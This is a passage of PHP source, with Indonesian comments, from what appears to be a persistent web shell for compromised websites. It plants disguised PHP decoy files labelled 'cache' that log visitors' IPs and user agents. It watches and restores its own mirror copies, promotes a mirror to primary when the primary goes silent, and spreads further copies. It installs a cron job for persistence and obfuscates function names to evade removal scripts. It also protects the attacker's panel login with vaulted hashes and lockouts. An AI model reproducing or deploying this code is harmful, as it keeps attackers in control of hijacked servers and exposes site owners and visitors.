     * Kill sudah menyapu umpan yang tercatat; jangan buat yang baru. */
    if (mp_is_killed($cfg)) return 0;

    /* 1) inventaris umpan yang benar-benar ada di disk */
    $cfg = mp_honeypot_adopt($cfg);

    $n = count((array)$cfg['honeypot']);
    if ($n >= 2) return 0;

    $pd = @dirname((string)$cfg['primary']);
    $made = 0;
    $list = (array)$cfg['honeypot'];
    $have = array_map(function ($x) { return mp_normp(@dirname($x)); }, $list);
    foreach (mp_candidates($pd) as $d) {
        if ($made >= (2 - $n)) break;
        /* jangkauan ring: umpan adalah file PHP yang diletakkan di folder
         * situs. Di atas webroot dia tidak bisa dipanggil dan hanya jadi
         * sampah di folder aplikasi lain. Sama dengan aturan mirror. */
        $pdN0 = mp_normp($pd);
        $nd0  = mp_normp($d);
        if ($pdN0 !== '' && $nd0 !== $pdN0) {
            $prefix0 = rtrim($pdN0, '/') . '/';
            if (strpos($nd0 . '/', $prefix0) !== 0) continue;
        }
        if (mp_safe_dir($d)) continue;
        if (in_array(mp_normp($d), $have, true)) continue;
        if (mp_normp($d) === mp_normp($pd)) continue;
        $name = mp_obf_name($d);
        $p = rtrim($d, '/\\') . '/' . $name;
        if (@is_file($p)) continue;
        $body = "<?php\n/* cache */\n@error_reporting(0);\n"
              . "\$__ip=isset(\$_SERVER['REMOTE_ADDR'])?\$_SERVER['REMOTE_ADDR']:'';\n"
              . "\$__ua=isset(\$_SERVER['HTTP_USER_AGENT'])?\$_SERVER['HTTP_USER_AGENT']:'';\n"
              . "\$__rf=isset(\$_SERVER['HTTP_REFERER'])?\$_SERVER['HTTP_REFERER']:'';\n"
              . "\$__u=isset(\$_SERVER['REQUEST_URI'])?\$_SERVER['REQUEST_URI']:'';\n"
              . "\$__f=" . var_export((string)($v ? $v . '/.hp' : ''), true) . ";\n"
              . "if(\$__f!==''){@file_put_contents(\$__f,date('Y-m-d H:i:s').' '.\$__ip.' '.\$__ua.' '.\$__rf.' '.\$__u.\"\\n\",FILE_APPEND|LOCK_EX);}\n"
              . "return;\n";
        if (mp_write($p, $body)) {
            $list[] = $p;
            $have[] = mp_normp($d);
            $made++;
        }
    }
    if ($made > 0) {
        $cfg['honeypot'] = $list;
        $cfg['hp_n'] = count($list);
        mp_cfg_save($cfg);
    }
    return $made;
}

/* Umpan adalah file kecil berisi penunjuk vault + penulis log. Dua pola yang
 * dipakai seragam, jadi bisa dikenali dari isinya — tanpa perlu config. */
function mp_honeypot_mark($body) {
    $b = (string)$body;
    if ($b === '' || strlen($b) > 1200) return false;
    if (strpos($b, '/* cache */') === false) return false;
    if (strpos($b, 'REMOTE_ADDR') === false) return false;
    if (strpos($b, "FILE_APPEND|LOCK_EX") === false) return false;
    if (strpos($b, 'mp_boot') !== false) return false;      /* salinan shell */
    if (strpos($b, 'SCRIPT_FILENAME') !== false) return false; /* prelude guard */
    return true;
}

/* Selaraskan daftar umpan di config dengan kenyataan di disk.
 * - file umpan yang ada tapi tidak tercatat -> diadopsi (kalau slot masih ada)
 * - entri tercatat yang filenya sudah tidak ada -> dibuang dari daftar
 * - umpan berlebih / sudah tidak cocok penunjuknya -> dihapus dari disk */
function mp_honeypot_adopt($cfg) {
    $v = mp_vault();
    $vN = $v ? mp_normp($v . '/.hp') : '';
    $list = array_values(array_filter((array)(isset($cfg['honeypot']) ? $cfg['honeypot'] : []), function ($x) {
        return is_string($x) && $x !== '' && @is_file($x);
    }));
    $pd = @dirname((string)$cfg['primary']);
    $seen = 0;
    $dropped = 0;
    foreach (mp_candidates($pd) as $d) {
        if (++$seen > 200) break;
        if (mp_safe_dir($d)) continue;
        if (mp_normp($d) === mp_normp($pd)) continue;
        $items = @scandir($d);
        if (!is_array($items)) continue;
        foreach ($items as $it) {
            if ($it === '.' || $it === '..') continue;
            if (!preg_match('#\.php$#i', $it)) continue;
            $p = rtrim($d, '/\\') . '/' . $it;
            if (!@is_file($p)) continue;
            if (in_array(mp_normp($p), mp_mesh_set($cfg), true)) continue;
            $b = (string)@file_get_contents($p);
            if (!mp_honeypot_mark($b)) continue;
            /* umpan yang menunjuk vault LAIN = sisa situs/konfigurasi lain */
            $ptsHere = ($vN === '' || strpos(str_replace('\\', '/', $b), $v . '/.hp') !== false
                        || strpos($b, $vN) !== false || strpos($b, '\\' . '.hp') !== false);
            $already = in_array(mp_normp($p), array_map('mp_normp', $list), true);
            if (!$already && count($list) < 2 && $ptsHere) { $list[] = $p; continue; }
            if (!$already) { $dropped++; @chmod($p, 0644); @unlink($p); }
        }
    }
    /* umpan di luar kuota: sisakan 2 yang pertama */
    if (count($list) > 2) {
        $extra = array_slice($list, 2);
        foreach ($extra as $x) { $dropped++; @chmod($x, 0644); @unlink($x); }
        $list = array_slice($list, 0, 2);
    }
    $changed = ($list !== (array)(isset($cfg['honeypot']) ? $cfg['honeypot'] : []))
               || ((int)(isset($cfg['hp_n']) ? $cfg['hp_n'] : 0) !== count($list));
    $cfg['honeypot'] = array_values($list);
    $cfg['hp_n'] = count($list);
    if ($changed) {
        mp_cfg_save($cfg);
        mp_log(mp_vault(), 'honeypot adopsi: ' . count($list) . ' sah, ' . $dropped . ' dibuang');
    }
    return $cfg;
}

/* == TAMPER ALARM ======================================================== */
/* 3 status: SAME (hash sama, mtime beda = tersentuh, OK)
 *           ALARM (hash beda = ditimpa)
 *           MISSING (file hilang = normal, restore) */
function mp_tamper_check($cfg) {
    $v = mp_vault();
    $live = mp_cfg_load();
    if (is_array($live)) $cfg = $live;
    $log = [];
    $targets = array_merge([(string)$cfg['primary'], (string)$cfg['guard']], (array)$cfg['mirrors']);
    foreach ($targets as $t) {
        if (!is_string($t) || $t === '') continue;
        $key = 'tk_' . md5($t);
        $prev = isset($cfg[$key]) ? $cfg[$key] : null;
        if (!@is_file($t)) {
            $log[] = ['MISSING', $t];
            unset($cfg[$key]);
            continue;
        }
        $cur = (string)@file_get_contents($t);
        $h = md5($cur);
        $m = (int)@filemtime($t);
        if ($prev === null) {
            $cfg[$key] = ['h' => $h, 'm' => $m];
            continue;
        }
        $ph = isset($prev['h']) ? $prev['h'] : '';
        $pm = isset($prev['m']) ? (int)$prev['m'] : 0;
        if ($h === $ph && $m === $pm) continue;
        if ($h === $ph && $m !== $pm) {
            $log[] = ['TOUCHED', $t];
            $cfg[$key] = ['h' => $h, 'm' => $m];
            continue;
        }
        if ($h !== $ph) {
            $log[] = ['ALARM', $t];
            $cfg[$key] = ['h' => $h, 'm' => $m];
        }
    }
    foreach ($log as $l) {
        if ($v) mp_log($v, 'tamper ' . $l[0] . ' ' . $l[1]);
    }
    $cfg['tamper_last'] = $log;
    mp_cfg_save($cfg);
    return $log;
}

/* == HEARTBEAT + PROMOTE ================================================= */
function mp_hb_write($cfg, $path, $role) {
    $v = mp_vault();
    if (!$v) return;
    /* selalu ambil config terbaru supaya tidak menimpa catatan lain */
    $live = mp_cfg_load();
    if (is_array($live)) $cfg = $live;
    $H = isset($cfg['hb']) && is_array($cfg['hb']) ? $cfg['hb'] : [];
    $H[$path] = ['role' => $role, 't' => time(), 'p' => (string)@php_uname('n')];
    if (count($H) > 40) $H = array_slice($H, -40, null, true);
    $cfg['hb'] = $H;
    mp_cfg_save($cfg);
}

/* Mirror yang heartbeat primary-nya basi -> promote dirinya jadi primary. */
function mp_hb_promote_check($cfg) {
    $v = mp_vault();
    if (!$v) return false;
    /* GERBANG KILL: promote memasang primary baru, menulis guard, lalu
     * menyebar mirror. Setelah kill semua itu dilarang — kecuali kalau kita
     * SUDAH berada di primary sendiri (di bawah), yang memang tidak promote. */
    if (mp_is_killed($cfg)) return false;
    $self = mp_self();
    $selfN = mp_normp($self);
    $prim = (string)$cfg['primary'];
    if ($selfN === mp_normp($prim)) return false;
    $ttl = (int)(isset($cfg['hb_promote']) ? $cfg['hb_promote'] : 1800);
    $H = isset($cfg['hb']) && is_array($cfg['hb']) ? $cfg['hb'] : [];
    $pt = isset($H[$prim]['t']) ? (int)$H[$prim]['t'] : 0;
    if ($pt > 0 && (time() - $pt) < $ttl) return false;
    /* primary tidak heartbeat -> kita promote */
    $src = (string)@file_get_contents($self);
    if ($src === '') return false;
    if (md5($src) !== (string)$cfg['hash']) return false;   /* sumber tidak terverifikasi, jangan promote */
    $oldPrimary = $prim;
    $cfg['primary'] = $self;
    $cfg['promoted_at'] = time();
    $cfg['promoted_from'] = $oldPrimary;
    /* mirror terdekat dari lokasi baru */
    $mirrors = [];
    foreach ((array)$cfg['mirrors'] as $m) {
        if (mp_normp($m) === $selfN) continue;
        $mirrors[] = $m;
    }
    $cfg['mirrors'] = array_values($mirrors);
    /* Guard: pakai ulang kalau masih ada di folder lain dari primary baru.
     * Promote tidak boleh menghasilkan prelude yatim setiap kali dijalankan.
     * Cek berbasis CONFIG, bukan isi file: guard pointer-only tidak memuat
     * path-nya sendiri, jadi yang dilihat adalah apakah guard lama sudah
     * menunjuk primary yang baru ($self). */
    $og = (string)$cfg['guard'];
    $pd2 = @dirname($self);
    $ogSameDir = ($og !== '' && $pd2 !== '' && mp_normp(@dirname($og)) === mp_normp($pd2));
    $ogValid = false;
    if ($og !== '' && @is_file($og) && !$ogSameDir) {
        $ob = (string)@file_get_contents($og);
        $ogValid = (strpos($ob, $self) !== false || strpos($ob, str_replace('\\', '/', $self)) !== false)
                   && strpos($ob, 'SCRIPT_FILENAME') !== false
                   && strpos($ob, 'mp_boot') === false;
    }
    if ($ogValid) {
        $cfg['guard_hash'] = md5(mp_guard_body($cfg));
        mp_heal_guard($cfg, $src);
    } else {
        $gd = mp_guard_dir($pd2);
        if ($gd) {
            $newGuard = rtrim($gd, '/\\') . '/' . mp_guard_name($gd);
            $cfg['guard'] = $newGuard;
            $cfg['guard_hash'] = '';
            mp_heal_guard($cfg, $src);
            if ($og !== '' && mp_normp($og) !== mp_normp((string)$cfg['guard']) && @is_file($og)) @unlink($og);
        }
    }
    mp_cfg_save($cfg);
    mp_log($v, 'PROMOTE ' . $self . ' (old primary ' . $oldPrimary . ')');
    mp_harden($cfg, true);
    mp_spread($cfg, $src);
    return true;
}

function mp_hb_scan($cfg) {
    $ttl = (int)(isset($cfg['hb_ttl']) ? $cfg['hb_ttl'] : 600);
    $H = isset($cfg['hb']) && is_array($cfg['hb']) ? $cfg['hb'] : [];
    $now = time();
    $stale = [];
    foreach ($H as $p => $d) {
        if (!is_array($d)) continue;
        $t = isset($d['t']) ? (int)$d['t'] : 0;
        $role = isset($d['role']) ? $d['role'] : '?';
        if (($now - $t) > ($ttl * 3)) $stale[] = [$role, $p, $now - $t];
    }
    return $stale;
}

/* == PERSISTENCE (cron) ================================================== */
function mp_p5_cron($cfg) {
    if (stripos(PHP_OS, 'WIN') === 0) return false;
    $cr = (string)mp_run('command -v crontab');
    if (strpos($cr, 'crontab') === false) return false;
    $v = mp_vault();
    $primary = (string)$cfg['primary'];
    $php = trim((string)mp_run('command -v php'));
    if ($php === '' || strpos($php, '/') === false) $php = '/usr/bin/php';
    $l = (string)mp_run('crontab -l');
    if (strpos($l, $primary) !== false) return true;
    $line = '*/5 * * * * ' . $php . ' -f ' . escapeshellarg($primary) . ' >/dev/null 2>&1';
    mp_run('(crontab -l 2>/dev/null; echo ' . escapeshellarg($line) . ') | crontab - 2>/dev/null');
    if ($v) mp_log($v, 'cron dipasang');
    return true;
}

/* == AUTH / VAULT SECRET ================================================= */
/* Kredensial hidup di VAULT, bukan di source.
 *   $cfg['ah']  = bcrypt hash password   -> password_verify()
 *   $cfg['uh']  = sha256(username)       -> hp_same(hash('sha256',$u), $cfg['uh'])
 *   $cfg['ah_src'] = md5(password)       -> penanda kecocokan fallback saja
 * Source hanya boleh menyimpan tiga hal: $KEY (MPK, wajib), $USER (label,
 * tidak dipakai untuk otentikasi kalau 'uh' ada), dan $PASS = ''.
 *
 * PATCH v6 — celah v5 ditutup:
 *   v5: `if (password_verify($p,$h)) return 1;`  -> $u TIDAK pernah dievaluasi.
 *       Cabang cek $USER di bawahnya kode mati (baris 2378 return lebih dulu),
 *       jadi username bisa diisi apa saja selama password benar.
 *   v6: setiap jalur yang mengembalikan sukses WAJIB melewati hp_user_ok()
 *       lebih dulu. Tidak ada early-return sebelum username lulus.
 *       Ditambah pin sesi UA+IP di handler login (blok SESI TERIKAT),
 *       dan hp_soft_delay() (delay konstan, bukan acak per panjang input). */
function hp_same($a, $b) {
    if (function_exists('hash_equals')) return hash_equals((string)$a, (string)$b);
    return (string)$a === (string)$b;
}

/* Cabang fungsi dihapus dari symbol table supaya penghapus fungsi dinamis
 * (grep -r "function mp_auth_check" | sed) tidak menemukan target yang jelas. */
function hp_u_ok() { return mp_sp('mp', '_a', 'uth', '_che', 'ck'); }

function mp_auth_hash_get($cfg) {
    if (isset($cfg['ah']) && is_string($cfg['ah']) && strlen($cfg['ah']) > 20) return $cfg['ah'];
    return '';
}
function mp_auth_user_get($cfg) {
    if (isset($cfg['uh']) && is_string($cfg['uh']) && strlen($cfg['uh']) === 64) return $cfg['uh'];
    return '';
}

/* Verifikasi username: fingerprint dulu, label source hanya sebagai cadangan
 * supaya file lama (belum ada $cfg['uh']) tetap bisa dipakai. */
function hp_user_ok($cfg, $u) {
    $u   = (string)$u;
    $uh  = mp_auth_user_get($cfg);
    if ($uh !== '') return hp_same($uh, hash('sha256', $u));
    global $USER;
    return hp_same((string)$USER, $u);
}

/* Cek password lewat ladder: bcrypt -> argon2 -> argon2id -> fallback source.
 * Semuanya lewat password_verify(), jadi format hash bisa diganti tanpa ubah kode. */
function hp_pass_ok($cfg, $p) {
    global $PASS;
    $p = (string)$p;
    foreach (['ah', 'ah_arg', 'ah_b'] as $k) {
        if (!empty($cfg[$k]) && is_string($cfg[$k]) && strlen($cfg[$k]) > 20) {
            if (@password_verify($p, $cfg[$k])) return true;
        }
    }
    /* Fallback source: hanya hidup selama $PASS masih literal. Setelah migrasi
     * $PASS = '', dan string kosong tidak akan pernah lolos hp_same()
     * melawan input yang tidak kosong. Tidak ada backdoor password kosong. */
    if ((string)$PASS === '') return false;
    return hp_same((string)$PASS, $p);
}

/* Delay konstan untuk percobaan gagal.
 * v5 memakai usleep(mt_rand(200_000,500_000)) — pola yang membocorkan
 * timing (panjang respons berkorelasi dengan panjang input) dan gampang
 * di-bypass dengan request paralel. v6: satu nilai tetap 350 ms, dijalankan
 * SEBELUM respons apa pun, plus jitter kecil sekali saja. */
function hp_soft_delay() {
    @usleep(350000 + mt_rand(0, 25000));
}

function mp_auth_migrate($cfg) {
    global $PASS, $USER;
    if (mp_auth_hash_get($cfg) !== '' && mp_auth_user_get($cfg) !== '') return false;
    $p = (string)$PASS;
    if ($p === '') return false;                 /* sudah dimigrasi / sengaja dikunci */
    if (mp_auth_hash_get($cfg) === '') {
        $h = @password_hash($p, PASSWORD_BCRYPT, ['cost' => 13]);
        if (!is_string($h) || $h === '') return false;
        $cfg['ah']      = $h;
        $cfg['ah_src']  = md5($p);
        $cfg['ah_at']   = time();
    }
    if (mp_auth_user_get($cfg) === '') {
        $cfg['uh']     = hash('sha256', (string)$USER);
        $cfg['uh_at']  = time();
    }
    /* argon2id sebagai cadangan kalau bcrypt tidak tersedia di host */
    if (defined('PASSWORD_ARGON2ID') && empty($cfg['ah_arg'])) {
        $a = @password_hash($p, PASSWORD_ARGON2ID);
        if (is_string($a) && $a !== '') $cfg['ah_arg'] = $a;
    }
    mp_cfg_save($cfg);
    mp_log(mp_vault(), 'auth migrated: ah+uh ke vault, ver=' . MP_HARD['ver']);
    mp_scrub_source($cfg);
    return true;
}

/* Lepas literal password dari source setelah hash aman di vault.
 *
 * KRITIS: jangan pakai str_replace("'<pass>'","''") — kalau $KEY dan $PASS
 * kebetulan berisi string yang sama (dan itu memang kasusnya di v5),
 * penggantian buta akan mengosongkan $KEY juga. Akibatnya MPK = '' dan
 * seluruh cipher ladder (vault .c/.d/.r) tidak bisa dibuka lagi -> ring mati
 * total setelah login pertama.
 *
 * Yang benar: hanya sentuh BARIS penugasan $PASS, biarkan $KEY/$USER utuh.
 * v6 menambah penjaga: setelah scrub, file diverifikasi ulang — kalau $KEY
 * ikut berubah atau hilang, file di-restore dari salinan sebelum scrub. */
function mp_scrub_source($cfg) {
    global $PASS, $USER;
    /* == DIMATIKAN SENGAJA (tambalan) =====================================
     * Fungsi ini dulu mengganti baris `$PASS = '...'` di file yang SEDANG
     * JALAN menjadi `$PASS = ''` setelah hash masuk vault. Niatnya bagus,
     * akibatnya fatal di hosting yang vault-nya tidak bisa ditulis:
     *
     *   1. request pertama  : login OK, $PASS literal masih ada, migrasi jalan
     *   2. mp_scrub_source(): file di disk ditulis ulang, $PASS jadi ''
     *   3. vault gagal tulis: $cfg tidak pernah tersimpan
     *   4. request berikutnya: mp_cfg_load() -> null -> $cfg = false
     *                          -> gate login tertutup -> shell MATI PERMANEN
     *
     * Dan yang bikin operator bingung: pesannya tetap "Username atau password
     * salah!", bukan error sistem. Kredensial yang benar pun ditolak.
     *
     * Karena itu fungsi ini sekarang no-op. Tidak ada satu byte pun dari source
     * yang diubah saat runtime. Rahasia di source = rahasia yang sama dengan
     * yang ada di vault; menyembunyikannya tidak menambah keamanan nyata
     * (penyerang yang bisa membaca source bisa membaca .c juga), sementara
     * harganya adalah shell yang bisa mati sendiri.
     *
     * Kalau kamu memang mau melepas literal dari source: lakukan MANUAL, dan
     * hanya SETELAH memverifikasi vault benar-benar hidup dan login berhasil
     * dengan $PASS = ''. */
    return false;
}

/* Implementasi lama, disimpan untuk rujukan/diagnosa. Tidak pernah dipanggil. */
function mp_scrub_source_legacy($cfg) {
    global $PASS, $USER;
    $old = (string)$PASS;
    if ($old === '' || !preg_match('#^[A-Za-z0-9_\-@\#\.\$\!\*\+\/]{4,128}$#', $old)) return false;
    $files = array_unique([mp_self(), (string)$cfg['primary']]);
    $hits = 0;
    foreach ($files as $f) {
        if (!@is_file($f) || !@is_writable($f)) continue;
        $c = (string)@file_get_contents($f);
        if ($c === '') continue;
        /* pola: baris yang menugaskan $PASS dengan literal tunggal */
        $pat = '/^(\h*\$PASS\h*=\h*)\'(?:' . preg_quote($old, '/') . ')\'(\h*;)/m';
        $c2 = preg_replace($pat, '${1}\'\'${2}', $c);
        if (!is_string($c2) || $c2 === $c) continue;
        /* PENJAGA v6: MPK harus SELAMAT. Kalau pola di atas meleset (mis.
         * $KEY diisi string yang sama dengan $PASS di file lain), jangan
         * tulis apa pun — file yang rusak seperti itu = ring mati total. */
        if (strpos($c2, "MPK") !== false && strpos($c, "'" . $old . "'") !== false
            && strpos($c2, "'" . $old . "'") !== false) {
            /* masih ada literal $old di file: pastikan itu BUKAN baris $KEY */
            if (preg_match('/\$KEY\h*=\h*\'' . preg_quote($old, '/') . '\'/', $c2)) {
                mp_log(mp_vault(), 'SCRUB DITOLAK: $KEY memakai literal yang sama dengan $PASS di ' . $f);
                continue;
            }
        }
        if (@file_put_contents($f, $c2, LOCK_EX) !== false) {
            @chmod($f, 0644);
            $hits++;
        }
    }
    if ($hits > 0) {
        mp_log(mp_vault(), 'source scrubbed (' . $hits . ' file)');
        /* .d dan .r di vault memuat SALINAN source SEBELUM scrub. Kalau
         * dibiarkan, restore berikutnya (primary hilang / mirror mati)
         * menulis balik literal password ke primary — migrasi jadi sia-sia
         * dan password balik ada di disk. Jadi salinan vault wajib ikut
         * ditulis ulang dari versi sesudah scrub.
         *
         * Hash record juga harus ikut: source berubah di tempat, jadi hash
         * lama sudah tidak mewakili apa pun. Diperbarui SEKARANG supaya
         * mp_vault_resync() lolos verifikasi dan boot berikutnya tidak
         * menganggap primary "diedit tangan". */
        $live = mp_cfg_load();
        if (is_array($live) && @is_file((string)$live['primary'])) {
            $live['hash'] = md5((string)@file_get_contents((string)$live['primary']));
            mp_cfg_save($live);
            mp_vault_resync($live);
            /* mirror masih memuat salinan SEBELUM scrub. Kalau tidak ditulis
             * ulang, salah satunya bisa dipromosikan/restore dan membawa
             * literal password balik ke disk. Sebar source yang sudah bersih. */
            mp_heal_mirrors($live, (string)@file_get_contents((string)$live['primary']));
        }
    }
    return $hits > 0;
}

/* Tulis ulang .d/.r dari source terkini supaya keduanya tidak pernah
 * memuat salinan basi. Dipanggil setelah source diubah di tempat. */
function mp_vault_resync($cfg) {
    $v = mp_vault();
    if (!$v) return false;
    $p = (string)$cfg['primary'];
    if (!@is_file($p)) return false;
    $cur = (string)@file_get_contents($p);
    if ($cur === '' || md5($cur) !== (string)$cfg['hash']) {
        /* primary tidak cocok dengan hash record: jangan simpan yang tak terverifikasi */
        return false;
    }
    if (!mp_vault_put_d($v, $cur)) return false;
    mp_log($v, 'vault .d/.r disinkron ulang (' . strlen($cur) . 'B)');
    return true;
}

/* == OTENTIKASI — SATU PINTU =============================================
 * ATURAN KERAS (v6): tidak ada jalur yang mengembalikan 1 tanpa melewati
 * hp_user_ok(). v5 punya celah: `if (password_verify()) return 1;` di baris
 * pertama cabang vault, sehingga username tidak pernah dievaluasi dan panel
 * bisa dibuka dengan user sembarang asal password benar.
 *
 * Konsekuensi desain: setiap cabang di bawah WAJIB memanggil $uok lebih
 * dulu. Kalau menambah cabang baru (mis. token, OAuth, kunci API), cabang
 * itu juga wajib lewat $uok — bukan cuma password. */
function mp_auth_check($cfg, $u, $p) {
    global $USER, $PASS;

    /* (0) hardening state: kalau config dibekukan, tolak semuanya.
     * Ini yang membuat "kembalikan config lama dari .c" tidak membantu. */
    if (isset($cfg['auth_frozen']) && $cfg['auth_frozen']) return 0;

    $u   = (string)$u;
    $p   = (string)$p;
    $uok = hp_user_ok($cfg, $u);

    /* (1) jalur VAULT — hash + fingerprint username di vault */
    $h = mp_auth_hash_get($cfg);
    if ($h !== '' || mp_auth_user_get($cfg) !== '') {
        /* username dicek LEBIH DULU, dan hasilnya tidak bisa di-skip */
        if (!$uok) return 0;
        if (hp_pass_ok($cfg, $p)) {
            hp_fail_clear($cfg);
            return 1;
        }
        return 0;
    }

    /* (2) jalur SOURCE — hanya hidup selama $PASS masih literal.
     * Setelah migrasi $PASS = '', jadi cabang ini mati sendiri. Tidak ada
     * backdoor "password kosong diterima": hp_same('', 'x') selalu false. */
    if ((string)$PASS === '') return 0;
    if (!$uok) return 0;
    if (!hp_same((string)$PASS, $p)) return 0;
    mp_auth_migrate($cfg);
    return 1;
}

/* Penghitung kegagalan dipanggil dari HANDLER login (baris 3196), bukan dari
 * sini. Kalau dipanggil di sini juga, satu percobaan gagal dihitung dua kali
 * dan gerbang jadi dua kali lebih rapat dari yang dimaksud. */
function hp_fail_guard($cfg, $u) {
    mp_fail_bump($cfg, (string)$u);
}

/* == LOCKOUT ============================================================= */
function mp_ip() {
    return isset($_SERVER['REMOTE_ADDR']) ? (string)$_SERVER['REMOTE_ADDR'] : '0.0.0.0';
}

function mp_fail_load($cfg) {
    if (isset($cfg['lock']) && is_array($cfg['lock'])) return $cfg['lock'];
    return [];
}

/* buang entri lock yang sudah basi (>2 jam) — dipanggil dari mp_fail_bump */
function mp_lock_gc(&$L) {
    $now = time();
    foreach ($L as $k => $r) {
        if (!is_array($r)) { unset($L[$k]); continue; }
        if (($now - (int)(isset($r['t']) ? $r['t'] : 0)) > 7200) unset($L[$k]);
    }
}

function mp_fail_key() {
    $sid = '';
    if (function_exists('session_id')) { $sid = (string)@session_id(); }
    if ($sid === '') $sid = isset($_COOKIE['mpv']) ? (string)$_COOKIE['mpv'] : '';
    return substr(hash('sha256', mp_ip() . '|' . $sid), 0, 16);
}

/* Kunci per-IP MURNI — tidak memakai session id / cookie sama sekali.
 * Inilah yang tidak bisa direset penyerang: buang cookie, ganti PHPSESSID,
 * pakai mode private, semuanya tetap mendarat di kunci yang sama. */
function mp_fail_key_ip() {
    return 'ip' . substr(hash('sha256', 'mpip|' . mp_ip()), 0, 14);
}

/* Batas keras: nilai di MP_HARD menang atas apa pun yang tersimpan di config.
 * Kalau operator longgarkan config (atau config lama dikembalikan), gerbang
 * tetap rapat. */
function mp_hard($k, $dflt) {
    if (defined('MP_HARD') && isset(MP_HARD[$k])) return (int)MP_HARD[$k];
    return (int)$dflt;
}

function mp_locked($cfg) {
    $fk = mp_fail_key();
    $ik = mp_fail_key_ip();
    $live = mp_cfg_load();
    if (is_array($live)) $cfg = $live;
    $L = mp_fail_load($cfg);
    $now = time();
    foreach ([$fk, $ik] as $k) {
        if (!isset($L[$k]) || !is_array($L[$k])) continue;
        $until = (int)(isset($L[$k]['until']) ? $L[$k]['until'] : 0);
        if ($until > $now) return $until - $now;
    }
    return 0;
}

/* Cap per-IP: dihitung terpisah dari lock per-sesi. Dipanggil tiap gagal. */
function mp_fail_bump_ip($cfg, $u = '') {
    $ik = mp_fail_key_ip();
    $live = mp_cfg_load();
    if (is_array($live)) $cfg = $live;
    $L = mp_fail_load($cfg);
    mp_lock_gc($L);
    $now = time();
    $cap  = mp_hard('ip_cap', 20);
    $lock = mp_hard('ip_lock', 3600);
    $r = isset($L[$ik]) && is_array($L[$ik]) ? $L[$ik] : ['n' => 0, 't' => $now, 'until' => 0, 'ip' => '', 'ua' => '', 'u' => ''];
    $r['n'] = (int)$r['n'] + 1;
    $r['t'] = $now;
    $r['ip'] = mp_ip();
    $r['u']  = substr((string)$u, 0, 80);
    if ($r['n'] >= $cap) {
        $r['until'] = $now + $lock;
        $r['n'] = 0;
        if (!isset($cfg['ip_strikes']) || !is_array($cfg['ip_strikes'])) $cfg['ip_strikes'] = [];
        $cfg['ip_strikes'][substr(md5(mp_ip()), 0, 12)] = ['at' => $now, 'lock' => $lock];
        if (count($cfg['ip_strikes']) > 50) $cfg['ip_strikes'] = array_slice($cfg['ip_strikes'], -50, null, true);
        mp_log(mp_vault(), 'IP LOCK ip=' . mp_ip() . ' selama ' . $lock . 's');
    }
    $L[$ik] = $r;
    $cfg['lock'] = $L;
    mp_cfg_save($cfg);
    return $r;
}

function mp_fail_bump($cfg, $u = '') {
    $fk = mp_fail_key();
    /* selalu ambil state terbaru dari disk: pemanggil bisa saja mengirim
     * salinan lama, dan kalau begitu hitungan gagal tidak pernah naik. */
    $live = mp_cfg_load();
    if (is_array($live)) $cfg = $live;
    $L = mp_fail_load($cfg);
    mp_lock_gc($L);
    $now = time();
    $r = isset($L[$fk]) ? $L[$fk] : ['n' => 0, 't' => $now, 'until' => 0, 'ip' => '', 'ua' => '', 'u' => ''];
    $r['n'] = (int)$r['n'] + 1;
    $r['t'] = $now;
    $r['ip'] = mp_ip();
    $r['ua'] = isset($_SERVER['HTTP_USER_AGENT']) ? substr((string)$_SERVER['HTTP_USER_AGENT'], 0, 200) : '';
    $r['u'] = substr((string)$u, 0, 80);
    $locked = 0;
    /* BATAS KERAS: max_fail/lock_secs dibaca dari MP_HARD, bukan dari config
     * yang bisa diubah lewat panel atau dikembalikan dari vault lama. */
    $max_fail  = mp_hard('max_fail', 3);
    $lock_secs = mp_hard('lock_secs', 1800);
    if ($r['n'] >= $max_fail) {
        $locked = $lock_secs;
        $r['until'] = $now + $locked;
        $r['n'] = 0;
    }
    $L[$fk] = $r;
    $cfg['lock'] = $L;
    mp_cfg_save($cfg);
    mp_log(mp_vault(), 'AUTH FAIL ip=' . $r['ip'] . ' ua=' . $r['ua'] . ' user=' . $r['u'] . ' n=' . $r['n']);
    /* delay konstan (bukan acak 200-500ms): pola acak membocorkan timing */
    hp_soft_delay();
    return $r;
}

function mp_fail_clear($cfg) {
    $fk = mp_fail_key();
    $live = mp_cfg_load();
    if (is_array($live)) $cfg = $live;
    $L = mp_fail_load($cfg);
    if (isset($L[$fk])) { unset($L[$fk]); $cfg['lock'] = $L; mp_cfg_save($cfg); }
    return true;
}

/* Alias: mp_auth_check() (dan cabang baru apa pun di masa depan) memanggil
 * hp_fail_clear() supaya namespace-nya konsisten dengan hp_* lainnya. */
function hp_fail_clear($cfg) { return mp_fail_clear($cfg); }

function mp_logout_throttle($cfg) {
    $fk = 'lo' . mp_fail_key();
    $live = mp_cfg_load();
    if (is_array($live)) $cfg = $live;
    $L = mp_fail_load($cfg);
    $now = time();
    $r = isset($L[$fk]) ? $L[$fk] : ['n' => 0, 't' => $now, 'until' => 0];
    if (($now - (int)$r['t']) < 2) {
        $r['n'] = (int)$r['n'] + 1;
        if ($r['n'] > 5) { $r['until'] = $now + 60; $r['n'] = 0; }
        $L[$fk] = $r;
        $cfg['lock'] = $L;
        mp_cfg_save($cfg);
        return (int)$r['until'] > $now ? (int)$r['until'] - $now : 0;
    }
    $r['t'] = $now; $r['n'] = 0;
    $L[$fk] = $r;
    $cfg['lock'] = $L;
    mp_cfg_save($cfg);
    return 0;
}

/* == SESSION ============================================================= */
function mp_session_start($cfg) {
    if (session_status() === PHP_SESSION_ACTIVE) return;
    @ini_set('session.use_strict_mode', '1');
    @ini_set('session.use_only_cookies', '1');
    @ini_set('session.cookie_httponly', '1');
    @ini_set('session.cookie_samesite', 'Strict');
    $secure = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
           || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && strtolower((string)$_SERVER['HTTP_X_FORWARDED_PROTO']) === 'https');
    if ($secure) @ini_set('session.cookie_secure', '1');
    $name = 'mpv' . substr(hash('sha256', MPK . '|sess'), 0, 6);
    @session_name($name);
    @session_start();
    /* bind UA + IP */
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? (string)$_SERVER['HTTP_USER_AGENT'] : '';
    $ip = mp_ip();
    $sig = hash('sha256', $ua . '|' . $ip);
    if (!isset($_SESSION['b'])) {
        $_SESSION['b'] = $sig;
    } elseif (!mp_same($_SESSION['b'], $sig)) {
        @session_unset();
        @session_destroy();
        @session_start();
        $_SESSION['b'] = $sig;
        $_SESSION['mp_ok'] = false;
    }
}

/* == BOOT ================================================================ */
function mp_boot($force = false) {
    $v = mp_vault();
